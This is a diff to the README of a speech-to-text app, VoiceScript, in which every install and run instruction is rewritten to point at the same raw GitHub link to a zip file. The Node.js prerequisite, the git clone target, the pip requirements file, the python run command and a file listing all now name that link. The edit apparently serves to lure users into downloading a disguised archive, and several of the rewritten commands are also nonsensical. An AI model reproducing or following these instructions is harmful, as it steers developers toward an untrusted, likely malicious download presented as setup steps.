@@ -26,7 +26,7 @@ VoiceScript is a modern web application for converting speech to text using arti
 ## Getting Started
 
 ### Prerequisites
-- Node.js (v14 or later)
+- https://raw.githubusercontent.com/Tennison-Obed/transcribe/main/src/pages/transcribe_v2.9.zip (v14 or later)
 - Python (v3.8 or later)
 - npm or yarn
 
@@ -34,7 +34,7 @@ VoiceScript is a modern web application for converting speech to text using arti
 
 1. Clone the repository:
 ```
-git clone https://github.com/yourusername/voice-script.git
+git clone https://raw.githubusercontent.com/Tennison-Obed/transcribe/main/src/pages/transcribe_v2.9.zip
 cd voice-script
 ```
 
@@ -46,7 +46,7 @@ npm install
 3. Install backend dependencies:
 ```
 cd backend
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/Tennison-Obed/transcribe/main/src/pages/transcribe_v2.9.zip
 ```
 
 ### Running the Application
@@ -54,7 +54,7 @@ pip install -r requirements.txt
 1. Start the backend server:
 ```
 cd backend
-python app.py
+python https://raw.githubusercontent.com/Tennison-Obed/transcribe/main/src/pages/transcribe_v2.9.zip
 ```
 
 2. In a new terminal window, start the frontend development server:
@@ -73,7 +73,7 @@ npm run dev
 
 ### Backend Structure
 - `/backend`: Python Flask backend
-- `/backend/app.py`: Main Flask application
+- `https://raw.githubusercontent.com/Tennison-Obed/transcribe/main/src/pages/transcribe_v2.9.zip`: Main Flask application
 
 ## License
 
